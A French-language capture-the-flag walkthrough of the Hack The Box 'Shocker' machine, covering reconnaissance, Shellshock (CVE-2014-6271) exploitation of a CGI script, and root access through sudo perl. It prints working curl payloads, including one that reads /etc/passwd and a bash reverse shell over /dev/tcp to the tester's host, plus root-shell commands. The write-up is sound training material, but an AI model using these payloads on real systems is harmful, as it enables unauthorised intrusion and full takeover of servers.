# Shocker

> **Statut** : [x] Root  
> **OS** : Linux (Ubuntu)  
> **Difficulté** : Easy  
> **HTB** : https://app.hackthebox.com/machines/Shocker  
> **Difficulté ressentie** : 3/10  
> **IP** : 10.129.8.165  

---

## Reconnaissance

### Nmap - scan initial

```bash
nmap -sV -sC -oA scan 10.129.8.165
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
```

### Analyse

- **Apache 2.4.18** sur Ubuntu - version ancienne  
- **SSH sur le port 2222** (non standard) - OpenSSH 7.2p2  
- Surface d'attaque principale : le serveur web sur le port 80  

### Enumeration web

Feroxbuster sur la racine ne donne rien d'intéressant. Le nom de la box ("Shocker") fait penser a Shellshock (CVE-2014-6271), qui cible les scripts CGI. On cherche donc dans `/cgi-bin/` :

```bash
feroxbuster -u http://10.129.8.165/cgi-bin/ -w common.txt -x pl,cgi,sh -s 200,301,302
```

```
200      GET        7l       18w      119c http://10.129.8.165/cgi-bin/user.sh
```

> **Piege** : il faut impérativement mettre le `/` final dans l'URL (`/cgi-bin/` et pas `/cgi-bin`).   
Sans le slash, feroxbuster ne trouve rien car le serveur répond différemment - Apache traite `/cgi-bin` comme un fichier et non comme un répertoire.

---

## Exploitation

### Vecteur d'attaque

**Shellshock - CVE-2014-6271** : vulnérabilité dans Bash permettant l'injection de commandes via les variables d'environnement. Quand Apache exécute un script CGI, il passe les en-têtes HTTP (User-Agent, Cookie, etc.) comme variables d'environnement a Bash. Un en-tête malveillant de la forme `() { :; }; commande` permet l'exécution de code arbitraire.

Référence : https://ine.com/blog/shockin-shells-shellshock-cve-2014-6271

### Confirmation avec Nmap

Première tentative avec `cmd=id` - erreur 500 (pas de chemin absolu) :

```bash
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=id 10.129.8.165
```

```
|     Exploit results:
|       500 Internal Server Error
```

Deuxième tentative avec les en-têtes CGI et le chemin absolu - succes :

```bash
nmap -sV -p80 --script http-shellshock \
  --script-args uri=/cgi-bin/user.sh,cmd='echo Content-Type: text/html; echo; /usr/bin/id' \
  10.129.8.165
```

```
|     Exploit results:
|       uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

> **Note** : le script nmap nécessite les chemins absolus (`/usr/bin/id` et pas `id`) et les en-têtes CGI (`echo Content-Type: text/html; echo;`) pour que la sortie s'affiche correctement.

### Exploitation avec curl

Test de la RCE :

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://10.129.8.165/cgi-bin/user.sh
```

Le serveur retourne le contenu de `/etc/passwd`, confirmant l'exécution de commandes en tant que `shelly`.

### Reverse shell

Lancer un listener :

```bash
nc -lvn 4444
```
_Pas de p sous mac_

Envoyer le reverse shell via Shellshock :

```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.182/4444 0>&1'" \
  http://10.129.8.165/cgi-bin/user.sh
```

```
shelly@Shocker:/usr/lib/cgi-bin$
```

Stabilisation du shell :

```bash
# Sur la cible - spawn un vrai TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z pour mettre en background
# Sur la machine locale
stty raw -echo; fg
# Retour sur la cible
export SHELL=bash
export TERM=xterm
```

---

## Privilege Escalation

### Enumération locale

```bash
shelly@Shocker$ sudo -l
```

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

L'utilisateur `shelly` peut exécuter **perl en tant que root** sans mot de passe.

### Escalade via Perl (GTFOBins)

Référence : https://gtfobins.org/gtfobins/perl/#file-read

Perl avec sudo permet de lire n'importe quel fichier en tant que root :

```bash
sudo perl -ne print /root/root.txt
```

Pour un shell root complet, on peut aussi faire :

```bash
sudo perl -e 'exec "/bin/bash";'
```

---

## Flags

- **User** : `[REDACTED]`
- **Root** : `[REDACTED]`

---

## Leçons apprises

- **Slash final obligatoire** : lors de l'énumération de répertoires avec feroxbuster (ou tout autre outil de fuzzing), toujours ajouter le `/` a la fin de l'URL quand on cible un répertoire connu. Sans le slash, Apache ne traite pas la requête de la même manière et les résultats sont vides.
- **Le nom de la box est un indice** : "Shocker" pointe directement vers Shellshock. Sur HTB, le nom de la machine donne souvent un indice sur le vecteur d'attaque.
- **Shellshock (CVE-2014-6271)** : penser a cette vuln des qu'on voit un répertoire `/cgi-bin/` sur un serveur Apache ancien. L'exploitation se fait en injectant `() { :; };` dans un en-tête HTTP (User-Agent, Cookie, Referer...).
- **Chemins absolus dans le contexte CGI** : les commandes doivent souvent utiliser leur chemin absolu (`/usr/bin/id` au lieu de `id`) car le PATH peut être restreint.
- **GTFOBins** : toujours vérifier les binaires autorisés en sudo sur GTFOBins. Perl avec sudo = lecture de fichiers root ou shell root immédiat.
